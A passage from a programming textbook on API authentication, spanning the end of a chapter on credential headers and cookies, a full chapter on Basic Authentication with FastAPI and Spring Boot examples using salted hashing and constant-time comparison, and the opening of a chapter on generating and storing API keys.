> **Common Mistake:** Putting an API key in the query string (`?api_key=...`). Query strings are frequently logged in plaintext by web servers, proxies, browser history, and analytics tools, and they can leak via the `Referer` header when a page makes further requests. Chapter 6 covers this pitfall in depth — for now, just recognize it as a real anti-pattern you'll see in the wild, not a recommended approach.

Full generation, storage, rotation, and rate-limiting details are Chapter 6's job — this section is purely "where does it go on the wire."

---

## 4.6 `Cookie` and `Set-Cookie`

These two headers are a matched pair traveling in **opposite directions**, and they are the mechanism underlying session-based authentication (Chapter 7).

```
   Client                                        Server
     │                                              │
     │   1. Login request (credentials in body)      │
     │ ────────────────────────────────────────────>│
     │                                              │
     │   2. Response with:                            │
     │      Set-Cookie: session_id=abc123; HttpOnly;  │
     │                  Secure; SameSite=Strict         │
     │ <────────────────────────────────────────────│
     │                                              │
     │   [ browser stores the cookie automatically ]   │
     │                                              │
     │   3. Every subsequent request automatically:    │
     │      Cookie: session_id=abc123                  │
     │ ────────────────────────────────────────────>│
```

**`Set-Cookie`** (response header, server → client): instructs the client to *store* a value and re-send it on future requests. Carries important flags, previewed here and covered in full in Chapter 7:

| Flag | Meaning |
|---|---|
| `HttpOnly` | JavaScript running on the page cannot read this cookie (mitigates certain theft techniques) |
| `Secure` | Cookie is only ever sent over HTTPS, never plain HTTP |
| `SameSite` | Controls whether the cookie is sent on requests originating from other sites (mitigates certain forgery techniques) |

**`Cookie`** (request header, client → server): the client automatically re-attaches previously stored cookies on every matching subsequent request — this automatic re-attachment (handled by the *browser*, not your application code) is the single biggest mechanical difference between cookie-based auth and the `Authorization` header schemes above, where the *client application code* must explicitly attach the header on every request itself.

> **Remember:** `Authorization` headers must be manually attached by client code on every request. `Cookie` headers, once set via `Set-Cookie`, are attached **automatically by the browser** for matching requests — no client code required. This difference has major implications for mobile apps vs browser-based web apps, unpacked fully in Chapter 7.

---

## 4.7 Summary table — every header in this chapter

| Header | Direction | Carries | Covered in depth |
|---|---|---|---|
| `Authorization` | Request | Scheme + credential (`Basic ...`, `Bearer ...`) | Ch. 5, 6, 8, 9 |
| `WWW-Authenticate` | Response | Tells the client *which* auth scheme is required/failed (seen already in Ch.1's 401 example) | Ch. 5 |
| `Cookie` | Request | Previously-set key-value pairs, auto-attached by browser | Ch. 7 |
| `Set-Cookie` | Response | Instructs client to store a value + security flags | Ch. 7 |
| `X-API-Key` | Request | A raw API key, custom header convention | Ch. 6 |

---

## 4.8 Seeing it hands-on — reading raw headers

**Reference implementation (Python / FastAPI) — an endpoint that echoes back exactly what credential header it received, useful for building intuition:**

```python
from fastapi import FastAPI, Header

app = FastAPI()

@app.get("/inspect-headers")
def inspect_headers(
    authorization: str | None = Header(default=None),
    x_api_key: str | None = Header(default=None, alias="X-API-Key"),
    cookie: str | None = Header(default=None),
):
    # FastAPI's Header() dependency reads a named header straight off the
    # raw HTTP request — this is the exact same mechanism you'll use in
    # every real authentication scheme from Chapter 5 onward, just without
    # any verification logic here yet.
    return {
        "authorization_header": authorization,
        "x_api_key_header": x_api_key,
        "cookie_header": cookie,
    }
```

```bash
curl -i http://127.0.0.1:8000/inspect-headers \
  -H "Authorization: Bearer sometoken123" \
  -H "X-API-Key: myapikey456" \
  -H "Cookie: session_id=abc123"
```

Response:
```json
{
  "authorization_header": "Bearer sometoken123",
  "x_api_key_header": "myapikey456",
  "cookie_header": "session_id=abc123"
}
```

**What's happening internally:** FastAPI's `Header()` parameter binding inspects the incoming request's raw header dictionary and matches it, case-insensitively, against the parameter name (converting Python's `snake_case` to HTTP's conventional `Kebab-Case` automatically, or using an explicit `alias` when the conversion wouldn't match, as with `X-API-Key`). No parsing of the *body* occurs at all for this — proving, hands-on, that headers are fully independent of body content, exactly as described in section 1.9–1.10.

**Spring Boot (Java) — same idea:**

```java
@RestController
public class HeaderInspectionController {

    @GetMapping("/inspect-headers")
    public Map<String, String> inspectHeaders(
            @RequestHeader(value = "Authorization", required = false) String authorization,
            @RequestHeader(value = "X-API-Key", required = false) String apiKey,
            @RequestHeader(value = "Cookie", required = false) String cookie) {

        // @RequestHeader binds directly to the named HTTP header, same
        // mechanism used later by Spring Security's filters (Chapter 11)
        // to extract credentials before your controller code ever runs.
        Map<String, String> result = new HashMap<>();
        result.put("authorization_header", authorization);
        result.put("x_api_key_header", apiKey);
        result.put("cookie_header", cookie);
        return result;
    }
}
```

---

## 4.9 Security considerations

- **Always require HTTPS when transmitting any credential-bearing header.** Headers are just as visible as the body to anyone able to intercept unencrypted traffic — putting a credential in a header instead of the body provides *zero* protection against network interception on its own; only TLS/HTTPS (Chapter 12) does that. Headers vs body is about *architecture and convention*, not *encryption*.
- **Never log the `Authorization` or `Cookie` header values in application or access logs.** This is an extremely common real-world mistake — logging middleware that dumps "all request headers for debugging" routinely leaks credentials into log files, which are often far less carefully secured than the credentials themselves.
- **Be deliberate about the `SameSite` and `Secure` cookie flags** (previewed here, detailed in Ch. 7) — misconfiguration is a common, real source of cookie-theft and forgery vulnerabilities.

> **Common Mistake:** Assuming a custom header name (like `X-API-Key` instead of `Authorization`) provides any security benefit by being "less obvious." This is another flavor of the "security through obscurity" mistake flagged in Chapter 2 — header *names* are visible to anyone inspecting the request; only the header *value*, and how well it's verified/protected, matters for security.

---

## Chapter 4 Summary

- Credentials belong in **headers** (or cookies, which are carried via headers), not the JSON body — for separation of concerns, infrastructure compatibility, universality across HTTP methods, and convention.
- The **`Authorization`** header carries `<scheme> <credentials>` — this book uses the **`Basic`** scheme (Ch. 5) and **`Bearer`** scheme (Ch. 6, 8, 9).
- A **bearer token** grants access to whoever holds it, with no further proof — this single fact drives most of the security guidance in later chapters.
- **API keys** most commonly travel as a `Bearer` token or via the custom `X-API-Key` header; putting them in the query string is a common but discouraged anti-pattern (logging/leakage risk).
- **`Set-Cookie`** (response) instructs the client to store a value with security flags (`HttpOnly`, `Secure`, `SameSite`); **`Cookie`** (request) is then auto-attached by the browser on future matching requests — no client code required, unlike `Authorization`.
- Headers are visible on the wire exactly like the body — only HTTPS/TLS (Chapter 12) protects credentials from interception; header placement is about architecture, not encryption.

---

## Interview Questions — Chapter 4

**Q1. Why is `Authorization` used for what is technically an authentication credential, given Chapter 3 drew a sharp line between authentication and authorization?**
It's a well-known HTTP naming quirk — the header is used by convention to carry the credential that establishes authentication (identity), even though its name suggests the authorization (permission) concept from Chapter 3. Knowing this distinction, and that it's just a naming artifact, is itself a good interview signal.

**Q2. What does "bearer token" mean, and why does it matter for security design?**
It means the token itself is the entire proof — whoever presents it is trusted, with no additional check. This matters because if a bearer token is stolen, the thief has full access as that identity until the token is revoked/expires — which is why bearer tokens typically need short lifetimes, HTTPS-only transmission, and secure storage (all covered later).

**Q3. What's the practical difference between how `Authorization` and `Cookie` headers get attached to outgoing requests?**
`Authorization` must be explicitly set by client-side code on every single request. `Cookie` values, once received via a `Set-Cookie` response header, are automatically re-attached by the browser on subsequent matching requests, with no application code needed.

**Q4. Does putting a credential in a header instead of the request body encrypt or hide it from network eavesdroppers?**
No. Headers are transmitted just as visibly as the body over an unencrypted connection. Only HTTPS/TLS actually encrypts the request (header and body alike) in transit. Header placement is purely an architectural/convention choice, unrelated to encryption.

**Q5. Why is putting an API key in a URL query string considered risky?**
Query strings are commonly logged in plaintext by servers, proxies, and analytics tools, stored in browser history, and can leak to third-party sites via the `Referer` header on subsequent navigation — all of which can expose the key well after the original request.

---

## Hands-On Exercises — Chapter 4

1. Using the FastAPI `/inspect-headers` endpoint from section 4.8, send requests with each of the three credential styles from this chapter (`Authorization: Basic ...`, `Authorization: Bearer ...`, `X-API-Key: ...`) and confirm you can see each one echoed back correctly.
2. Manually Base64-decode the string `YW51ajpzZWNyZXQxMjM=` (by hand, using any tool/language) and confirm it reveals `anuj:secret123` — write one sentence on why this proves Base64 is not encryption.
3. Log into any website you use, open your browser's developer tools, find the `Set-Cookie` response header on the login response (Network tab), and identify which of `HttpOnly`, `Secure`, and `SameSite` flags are present.
4. Explain, in your own words, why a mobile app (not a browser) cannot rely on "automatic cookie attachment" the same way a browser-based web app can — think back to what actually performs that automatic re-attachment.

## Mini Project — Chapter 4

Build a small **header inspector** service (extending section 4.8) that:
- Accepts requests with any combination of `Authorization`, `X-API-Key`, and `Cookie` headers.
- Returns a JSON report classifying what it received: which scheme was used in `Authorization` (if any), whether an API key was present and where, and whether a `Cookie` header was present.
- Explicitly returns a warning field `"insecure_transport": true` if you can detect the request didn't arrive over HTTPS (in local dev with plain `uvicorn`, this will always be true — note that in your README, and explain why Chapter 12's HTTPS requirement matters).

---

## Preparing for Chapter 5

We now know precisely *where* a credential goes on the wire and in what shape. Chapter 5 takes the very first scheme from this catalog — `Authorization: Basic ...` — and goes genuinely deep: its history, exactly how Base64 encoding works and why it is not encryption, the full request/response flow, real advantages and serious disadvantages, and complete working implementations in both FastAPI and Spring Boot. This is where the book stops being purely conceptual and starts building real, working authentication.

---

*End of Chapter 4.*

---

# Chapter 5 — Basic Authentication

## 5.0 Where we left off

This is the chapter where the book stops being purely conceptual. Chapter 4 told you *exactly* where a credential goes on the wire (`Authorization: <scheme> <credentials>`) — now we implement the simplest possible scheme that fills in that blank: **Basic Authentication**. We'll build it against the exact books API you scaffolded in Chapter 1, so you can feel the "before/after" directly.

---

## 5.1 History and context

Basic Authentication was defined very early in the web's history, as part of the original HTTP specification work in the 1990s. It predates cookies, sessions, JWTs, and OAuth entirely — at the time, it was essentially *the only* standardized way to protect a web resource. Browsers to this day still have built-in support for it: if a server responds with the right challenge (section 5.4), the browser itself pops up a native username/password dialog, with zero custom UI code required from the developer.

It has survived for decades not because it's sophisticated, but because it's trivially simple to implement on both ends — which is exactly why understanding it thoroughly (including its real weaknesses) is such a good foundation before moving to more complex schemes.

---

## 5.2 How it works — the core idea

**Simple explanation:** The client sends its username and password, joined together and lightly obfuscated, on *every single request*. The server decodes them and checks them against its records.

**Technical definition:** Basic Authentication is a scheme in which the client concatenates a username and password as `username:password`, encodes that string using Base64, and sends it in the `Authorization` header with the `Basic` scheme name.

This directly reuses the generic sequence diagram from Chapter 2 (section 2.6) — here it is, specialized:

```
   Client                                        Server
     │                                              │
     │  GET /books  HTTP/1.1                          │
     │  Authorization: Basic YW51ajpzZWNyZXQxMjM=      │
     │ ──────────────────────────────────────────────>│
     │                                              │  1. Split "Basic " off,
     │                                              │     get Base64 string
     │                                              │  2. Base64-decode it
     │                                              │     -> "anuj:secret123"
     │                                              │  3. Split on first ":"
     │                                              │     -> username="anuj",
     │                                              │        password="secret123"
     │                                              │  4. Look up "anuj" in the
     │                                              │     user store, compare
     │                                              │     password (hashed! see 5.7)
     │                                              │
     │  200 OK  +  book data                          │  5. Match -> proceed
     │ <──────────────────────────────────────────────│     No match -> 401
```

---

## 5.3 Base64 encoding — precisely, since it's constantly misunderstood

This is worth slowing down for, because "Base64 is not encryption" is one of the most important, most frequently misunderstood facts in this entire subject.

**Simple explanation:** Base64 is a way of representing arbitrary bytes (including text) using only 64 printable characters (`A-Z`, `a-z`, `0-9`, `+`, `/`, and `=` for padding), so that data can safely travel through systems that only handle plain text.

**Technical explanation:** Base64 works by taking input bytes 3 at a time (24 bits), and re-grouping those 24 bits into four 6-bit chunks, each of which maps to one of 64 possible printable characters via a fixed, publicly known lookup table.

```
   Input text:     "an"
   ASCII bytes:     01100001  01101110         (2 bytes = 16 bits)
   Padded to 24 bits, grouped into 6-bit chunks:
                    011000 010110 1110 00(pad)
   Each 6-bit chunk -> Base64 alphabet lookup:
                    24  =>  'Y'
                    22  =>  'W'
                    56  =>  '4'
                    (padding) => '='
   Result:         "YW4="
```

You do not need to be able to hand-encode Base64 from memory — the point is to see that this is a **deterministic, publicly documented, reversible mapping**, with **no secret key involved anywhere**. Anyone — not just the intended server — can decode it instantly:

```python
>>> import base64
>>> base64.b64decode("YW51ajpzZWNyZXQxMjM=").decode()
'anuj:secret123'
```

> **Remember:** Base64 is **encoding**, not **encryption**. Encoding transforms data into a different representation using a *public, reversible* algorithm — anyone can reverse it, with no secret required. Encryption transforms data using a *secret key*, such that only someone holding that key can reverse it. Confusing these two is a critical, common security mistake — and it's precisely *why* Basic Auth has a hard, non-negotiable HTTPS requirement (section 5.8).

> **Interview Tip:** "Why does Basic Auth use Base64 at all, if it provides no security?" Because HTTP headers are restricted to certain character sets and can have issues with raw binary/special characters (like a literal `:` inside a password, or non-ASCII characters); Base64's *purpose here is transport-safety* (reliable transmission), not confidentiality. This is a genuinely excellent interview answer because it shows you understand Base64's actual design purpose, not just "it's how Basic Auth works."

---

## 5.4 The full request/response flow, including the browser challenge

**The initial, unauthenticated request:**
```http
GET /books HTTP/1.1
Host: api.example.com
```

**Server's challenge response** — this is what tells a browser to pop up its native login dialog:
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Books API"
Content-Type: application/json

{"error": "unauthorized", "message": "Credentials required"}
```

> **Term defined — `WWW-Authenticate`:** A response header the server sends alongside a `401` to tell the client *which* authentication scheme is expected (here, `Basic`) and, optionally, a `realm` — a human-readable label identifying *which* protected area this is, useful when a server protects multiple distinct resource groups differently.

**The retried, now-authenticated request:**
```http
GET /books HTTP/1.1
Host: api.example.com
Authorization: Basic YW51ajpzZWNyZXQxMjM=
```

**Successful response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id": 1, "title": "Clean Code", "author": "Robert C. Martin"}]
```

**Failed response (wrong password):**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Books API"

{"error": "unauthorized", "message": "Invalid credentials"}
```

> **Common Mistake:** Beginners are often surprised that Basic Auth doesn't have an explicit "login" endpoint or "logout" action. There is no session or token — the client simply re-sends the username and password on **every single request**, forever, for as long as it wants to stay authenticated. This is directly tied to statelessness (Chapter 1, 2): there's nothing to "log out" of, because the server never stored anything about you between requests in the first place.

---

## 5.5 Reference implementation (Python / FastAPI)

We extend the exact books API from Chapter 1's mini-project.

```python
# main.py — Basic Authentication protecting the Chapter 1 books API
import base64
import hashlib
import secrets
from fastapi import FastAPI, Header, HTTPException

app = FastAPI()

BOOKS = [
    {"id": 1, "title": "Clean Code", "author": "Robert C. Martin"},
    {"id": 2, "title": "Designing Data-Intensive Applications", "author": "Martin Kleppmann"},
]

# NEVER store plaintext passwords — see section 5.7 and Chapter 12.
# This simulates a "users table" storing only a salted hash.
def hash_password(password: str, salt: bytes) -> str:
    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100_000).hex()

_salt = secrets.token_bytes(16)
USER_STORE = {
    "anuj": {"salt": _salt, "password_hash": hash_password("secret123", _salt)},
}

def verify_basic_auth(authorization: str | None) -> str:
    if authorization is None or not authorization.startswith("Basic "):
        # No credential at all, or wrong scheme entirely -> 401,
        # WITH the WWW-Authenticate challenge header from section 5.4.
        raise HTTPException(
            status_code=401,
            detail="Missing credentials",
            headers={"WWW-Authenticate": 'Basic realm="Books API"'},
        )

    encoded = authorization.removeprefix("Basic ")
    try:
        decoded = base64.b64decode(encoded).decode("utf-8")
        username, password = decoded.split(":", 1)
    except Exception:
        # Malformed Base64 or missing ":" separator -> still a 401,
        # never a 500 — malformed client input should never crash the server.
        raise HTTPException(
            status_code=401,
            detail="Malformed credentials",
            headers={"WWW-Authenticate": 'Basic realm="Books API"'},
        )

    user = USER_STORE.get(username)
    if user is None:
        raise HTTPException(status_code=401, detail="Invalid credentials",
                             headers={"WWW-Authenticate": 'Basic realm="Books API"'})

    # Re-hash the SUPPLIED password with the STORED salt, then compare
    # hash-to-hash — the server never re-derives or stores a plaintext
    # password anywhere, ever.
    supplied_hash = hash_password(password, user["salt"])
    # secrets.compare_digest prevents a "timing attack" — a naive `==`
    # comparison can leak how many leading characters matched based on
    # how long the comparison took, letting an attacker guess a password
    # byte-by-byte. This is a real, documented attack class (Chapter 12).
    if not secrets.compare_digest(supplied_hash, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid credentials",
                             headers={"WWW-Authenticate": 'Basic realm="Books API"'})

    return username  # identity established

@app.get("/books")
def list_books(authorization: str | None = Header(default=None)):
    verify_basic_auth(authorization)
    return BOOKS
```

**Line-by-line — what's happening internally and why:**
- `hash_password` uses **PBKDF2** (a deliberately slow, salted hashing algorithm) instead of storing plaintext passwords — this is previewed fully in Chapter 12; for now, just know: **a server should never be able to see or recover a user's actual password**, only verify a supplied password produces a matching hash.
- `_salt` is unique random data mixed into the hash so that two users with the *same* password don't produce the *same* stored hash — this defeats precomputed "rainbow table" lookup attacks.
- `authorization.removeprefix("Basic ")` strips the scheme name, isolating just the Base64 payload, matching the wire format from section 5.2.
- `base64.b64decode(...).decode("utf-8")` reverses the encoding from section 5.3 — note this is instantaneous and requires no secret, exactly as explained there.
- `decoded.split(":", 1)` — the `1` limits it to a single split, so a password that itself contains a `:` character isn't accidentally truncated.
- `secrets.compare_digest` performs a **constant-time comparison** specifically to prevent timing attacks, rather than Python's default `==`, which can exit early on the first mismatched character (and is therefore measurably, exploitably faster for "more wrong" guesses).
- Every failure path returns a `WWW-Authenticate` header alongside the `401`, matching the real challenge/response flow from section 5.4 — not just an arbitrary error body.

```bash
# No credentials -> 401 + WWW-Authenticate challenge
curl -i http://127.0.0.1:8000/books

# Correct credentials (curl encodes Basic auth for you with -u)
curl -i http://127.0.0.1:8000/books -u anuj:secret123

# Wrong password -> 401
curl -i http://127.0.0.1:8000/books -u anuj:wrongpassword
```

---

## 5.6 Reference implementation (Spring Boot / Java)

```java
@Configuration
public class SecurityConfig {

    @Bean
    public UserDetailsService userDetailsService(PasswordEncoder encoder) {
        // In-memory user store for demonstration; Chapter 11 covers
        // wiring this to a real database via UserDetailsService properly.
        UserDetails anuj = User.builder()
            .username("anuj")
            // BCrypt (Chapter 12) handles salting + slow-hashing internally,
            // so unlike the manual FastAPI example, we don't manage salt ourselves.
            .password(encoder.encode("secret123"))
            .roles("USER")
            .build();
        return new InMemoryUserDetailsManager(anuj);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/books/**").authenticated()  // require auth
                .anyRequest().permitAll()
            )
            // This one line enables the ENTIRE Basic Auth mechanism from
            // this chapter: parsing the Authorization header, Base64-decoding
            // it, and checking it against userDetailsService — all handled
            // by Spring Security's filter chain, which runs BEFORE your
            // controller code (this is the "authentication as cross-cutting
            // infrastructure" pattern previewed in Chapter 3).
            .httpBasic(Customizer.withDefaults());
        return http.build();
    }
}

@RestController
public class BookController {
    @GetMapping("/books")
    public List<Book> listBooks() {
        // By the time this method runs, Spring Security has ALREADY
        // enforced Basic Auth — if we're here, authentication succeeded.
        return bookRepository.findAll();
    }
}
```

**What's happening internally:** `.httpBasic(Customizer.withDefaults())` wires in Spring Security's `BasicAuthenticationFilter`, which performs exactly the steps you wrote by hand in the FastAPI version — extract the header, strip `Basic `, Base64-decode, split on `:`, and delegate to `UserDetailsService` + `PasswordEncoder` for verification — but as reusable, declarative infrastructure rather than per-endpoint code. This is precisely the architectural pattern flagged in Chapter 3 (section 3.6): authentication as cross-cutting middleware, invisible to individual controllers.

---

## 5.7 Storing passwords — a critical detour

We touched this in the code above; it's worth stating as an explicit, standalone principle because it's so consequential:

> **Remember: never store passwords in plaintext, and never store them using fast, general-purpose hash functions like plain SHA-256 or MD5 either.** Use a slow, purpose-built password hashing algorithm (BCrypt, Argon2, or PBKDF2, all previewed here, detailed in Chapter 12) with a unique salt per user. If your user database is ever breached, properly-hashed passwords remain extremely expensive to reverse; plaintext or naively-hashed passwords are compromised instantly.

---

## 5.8 The HTTPS requirement — non-negotiable

Given everything in section 5.3, this should now be self-evident, but it's important enough to state as a hard rule: **Basic Authentication must never be used without HTTPS.**

```
   WITHOUT HTTPS (catastrophic):

   Client ---- Authorization: Basic YW51ajpzZWNyZXQxMjM= ----> Server
                       ▲
                       │  anyone on the network path (public WiFi,
                       │  a compromised router, an ISP) can read
                       │  this entire header in plaintext and
                       │  instantly Base64-decode it to get the
                       │  ACTUAL username and password.
```

With HTTPS, the entire request — headers included — is encrypted in transit (full mechanism in Chapter 12), so even though Base64 itself provides no protection, the TLS layer wrapping the whole connection does.

---

## 5.9 Advantages and disadvantages

| Advantages | Disadvantages |
|---|---|
| Extremely simple to implement on both client and server | Password sent on **every single request** — far more exposure surface than sending it once at login |
| No server-side session storage needed | No built-in logout mechanism — only way to "log out" is for the client to stop sending the header |
| Native browser support (built-in login dialog) | Credentials are trivially recoverable if HTTPS is ever misconfigured or bypassed (section 5.3, 5.8) |
| Works well for simple server-to-server or internal tooling scenarios | Poor UX for real applications — no "remember me," no password reset flow integration, ugly native browser dialog |
| No token/cookie management complexity | Doesn't scale well to fine-grained permissions, expiry, or revocation (motivating Chapters 6–8) |

> **Interview Tip:** "When would you actually choose Basic Auth in a real system today?" Good answer: narrow, low-risk, internal scenarios — e.g., a health-check endpoint behind a corporate VPN, simple server-to-server calls where both ends are trusted infrastructure, or quick internal tooling — always over HTTPS, never for public-facing, user-login scenarios, which is what the rest of this book (Sessions, JWT, OAuth) is built for.

---

## 5.10 Common mistakes (consolidated)

- Treating Base64 as if it provides confidentiality (section 5.3).
- Deploying Basic Auth without HTTPS enforced (section 5.8).
- Comparing passwords with `==` instead of a constant-time comparison (section 5.5).
- Storing plaintext or naively-hashed passwords (section 5.7).
- Forgetting the `WWW-Authenticate` challenge header on 401 responses, breaking native browser prompt behavior and violating the HTTP spec's expected contract.
- Using Basic Auth for a public-facing consumer login system, where the poor UX and per-request password exposure make it a genuinely poor fit compared to the schemes in Chapters 7–9.

---

## Chapter 5 Summary

- **Basic Authentication** sends `Base64(username:password)` in the `Authorization: Basic ...` header on every request — no session, no login/logout concept, direct reuse of Chapter 2's generic auth sequence.
- **Base64 is encoding, not encryption** — reversible by anyone, with no secret key; its purpose is transport-safety for special characters, not confidentiality.
- The **`WWW-Authenticate`** response header, sent with a `401`, tells the client which scheme is expected and triggers native browser login dialogs.
- **HTTPS is non-negotiable** for Basic Auth — Base64 provides zero protection on its own; only TLS encrypts the credential in transit.
- Passwords must **never** be stored in plaintext or with fast general-purpose hashes — use BCrypt/Argon2/PBKDF2 with per-user salts, and compare with constant-time functions to avoid timing attacks.
- Basic Auth is simple but has real, serious drawbacks (repeated exposure, no logout, poor UX) — appropriate for narrow, low-risk, often internal/service-to-service scenarios, not general consumer authentication.

---

## Interview Questions — Chapter 5

**Q1. Is Basic Authentication secure?**
It can be *sufficiently* secure for narrow use cases, but only when used strictly over HTTPS — Base64 itself provides no confidentiality, so without TLS, credentials are trivially exposed to anyone observing network traffic. Even with HTTPS, it has structural weaknesses (repeated credential exposure, no revocation/logout) that make it a poor fit for general-purpose consumer authentication.

**Q2. Walk through exactly what happens, byte by byte, when a client sends `Authorization: Basic YW51ajpzZWNyZXQxMjM=`.**
The server strips the `Basic ` prefix, Base64-decodes the remaining string (a public, reversible, keyless transformation) to recover `anuj:secret123`, splits on the first `:` to get username `anuj` and password `secret123`, looks up `anuj` in its user store, re-hashes the supplied password using that user's stored salt, and compares the resulting hash (using a constant-time comparison) to the stored hash.

**Q3. Why is there no "logout" in Basic Authentication?**
Because there's no server-side session or stored state to invalidate (Chapter 1–2's statelessness) — the client simply re-sends credentials on every request. "Logging out" only means the client application stops attaching the header; the server has no concept of a session to terminate.

**Q4. What's the security risk of comparing passwords with a simple `==` operator, and how do you fix it?**
A naive `==` comparison can return faster when an early character mismatches (short-circuit evaluation), creating a measurable timing difference an attacker can exploit to guess a password/hash byte by byte — a real attack class called a timing attack. The fix is a constant-time comparison function (like Python's `secrets.compare_digest`), which always takes the same amount of time regardless of where a mismatch occurs.

**Q5. Why does Basic Auth send the password on every request, and why is that considered a disadvantage compared to schemes covered later in this book?**
Because there's no session or token standing in for a one-time login — every request must independently prove identity from scratch. This increases the number of times the raw password crosses the network and is processed by the server, compared to schemes (Sessions, Chapter 7; JWT, Chapter 8) where the password is only used once, at login, to obtain a token/session that's used thereafter instead.

---

## Hands-On Exercises — Chapter 5

1. Run the FastAPI implementation from section 5.5. Use `curl -v` (verbose mode) with correct and incorrect credentials, and capture the raw `Authorization` header curl sends — decode it by hand and confirm it matches what you typed.
2. Deliberately send a malformed `Authorization` header (e.g., `Authorization: Basic not-valid-base64!!!`) and confirm the server returns a clean `401` rather than crashing — explain in the code which line prevents a crash.
3. In Postman, use its built-in "Basic Auth" tab (rather than manually constructing the header) against your running FastAPI server, and compare the raw request Postman generates to what you built by hand in section 5.2.
4. Explain, in writing, exactly what an attacker positioned on an unencrypted WiFi network could do if they intercepted a Basic Auth request to your API — be specific about which step of section 5.3 makes this possible.

## Mini Project — Chapter 5

Fully secure the Chapter 1 books API with Basic Authentication, in **both** FastAPI and Spring Boot (build both — the comparison is the point of the exercise).

Requirements:
- At least two users in your store, each with independently salted/hashed passwords.
- `GET /books` and `GET /books/{id}` both require valid Basic Auth.
- Correct `401` + `WWW-Authenticate` behavior on missing/invalid credentials.
- A short written comparison (5–10 sentences) of how much code the FastAPI version required manually versus how much Spring Security's `.httpBasic()` handled for you — and what that tells you about the trade-off between "understanding every step" (FastAPI) and "framework-managed infrastructure" (Spring Boot).

---

## Preparing for Chapter 6

Basic Auth ties a request directly to a *human's* username and password. But a huge fraction of real-world API traffic isn't a human logging in at all — it's one *application* or *service* calling another, where "username and password" doesn't really fit the mental model. Chapter 6 covers **API Keys**: how they're generated, stored, rotated, expired, and rate-limited — the standard answer for machine-to-machine and third-party-integration authentication.

---

*End of Chapter 5.*

---

# Chapter 6 — API Key Authentication

## 6.0 Where we left off

Chapter 5 ended on a specific gap: Basic Auth models a *human* logging in with a username and password. But think back to Chapter 1's opening analogy — a weather app calling a weather service, a backend calling a third-party payment gateway. There's no "human with a password" anywhere in that picture; it's one *piece of software* identifying itself to another. API keys are the standard answer to that specific situation.

---

## 6.1 What API Keys are

**Simple explanation:** An API key is a long, random, unique string that identifies *which application, account, or integration* is making a request — think of it as a "who's calling" badge for software, not for humans.

**Technical definition:** An API key is a bearer credential (Chapter 4, section 4.4) — usually a long, high-entropy random string — issued by a service to a specific consumer (a developer, an application, a partner integration), used to identify and authenticate that consumer on every request, typically without any separate "login" step.

**Real-world analogy — the building access card:**

```
   A password (Basic Auth) is like a secret PIN only YOU know and
   type in every time.

   An API key is more like an access card issued to a specific
   CONTRACTOR COMPANY (not an individual employee) — swipe it at
   the door, the building knows exactly which company is entering,
   without asking "who specifically are you" the way a personal
   ID check would.
```

**How this differs from Basic Auth, precisely:**

| | Basic Auth | API Key |
|---|---|---|
| Identifies | A specific human user | An application, account, or integration |
| Format | `username:password`, Base64-encoded | A single opaque random string |
| Typical transport | `Authorization: Basic ...` | `Authorization: Bearer ...`, `X-API-Key`, or (discouraged) query string |
| Typical use case | User login to a consumer-facing app | Machine-to-machine calls, third-party integrations, developer access to a public API |
| Fine-grained revocation | Hard (would mean changing the user's password) | Easy — revoke just that one key without affecting the account's login |

---

## 6.2 How API Keys are generated

**Simple explanation:** A good API key is just a long, unpredictable random string — its entire security rests on being effectively impossible to guess.

**Technical explanation:** Keys should be generated using a **cryptographically secure random number generator (CSPRNG)** — never something predictable like a timestamp, an incrementing counter, or a weak pseudo-random function. Length and character set are chosen to give enough **entropy** (unpredictability) that guessing is computationally infeasible.

> **Term defined — entropy:** A measure of how unpredictable a value is, usually expressed in bits. Each additional bit of entropy doubles the number of guesses an attacker needs on average. A 256-bit random key has 2^256 possible values — a number so large that brute-forcing it is not a realistic threat with any current or foreseeable computing power.

```python
import secrets

def generate_api_key(prefix: str = "sk_live") -> str:
    # secrets.token_urlsafe uses the OS's cryptographically secure
    # random source — NEVER use Python's `random` module for this,
    # it is NOT cryptographically secure and is predictable given
    # enough observed outputs.
    random_part = secrets.token_urlsafe(32)  # 32 bytes = 256 bits of entropy
    return f"{prefix}_{random_part}"

# Example output: sk_live_kQ2mF9xR7...
```

**Prefixing convention:** Many real-world API providers prefix keys with a recognizable tag (`sk_live_`, `sk_test_`, `pk_...`) — this isn't for security, it's for **operational safety**: it lets automated secret-scanning tools detect leaked keys in source code repositories, and lets humans instantly recognize "this is a live production key" versus a test key at a glance.

> **Common Mistake:** Generating API keys from predictable inputs — a UUID derived from a timestamp, a hash of the user's email, an incrementing integer. If an attacker can predict or narrow down the keyspace at all, the key's entire security model collapses. Always use a CSPRNG with sufficient length.

---

## 6.3 Storage — a critical parallel to Chapter 5's password lesson

The exact same principle from section 5.7 applies here, with one important nuance: **the server should never store the raw API key in a form that would let a database breach hand out working keys directly.**

```
   WRONG:  users_table:  { user_id: 8823, api_key: "sk_live_kQ2mF9xR7..." }
           (a DB breach = every API key is immediately usable by the attacker)

   RIGHT:  api_keys_table: { user_id: 8823,
                              key_hash: SHA-256("sk_live_kQ2mF9xR7..."),
                              key_prefix: "sk_live_kQ2m" }
           (a DB breach only exposes hashes — useless without reversing
            the hash, which is computationally infeasible for a proper
            hash function; key_prefix is stored in the clear ONLY so a
            dashboard can show users "which key" without ever displaying
            the full secret again after initial issuance)
```

> **Remember:** Store a **hash** of the API key (not the raw key itself), the same way you'd never store a raw password — see section 5.7. Since API keys are already high-entropy random strings (unlike human-chosen passwords), a fast cryptographic hash like SHA-256 is acceptable here (unlike passwords, which need slow, purpose-built hashing — the difference is explained fully in Chapter 12).
>
> Show the full raw key to the user **exactly once**, at creation time, and never again — this is why so many real dashboards (Stripe, AWS, GitHub) warn "copy this now, you won't see it again."

---

## 6.4 Rotation

**Simple explanation:** Rotation means periodically replacing an API key with a new one, even if it hasn't been compromised — as a standard hygiene practice.

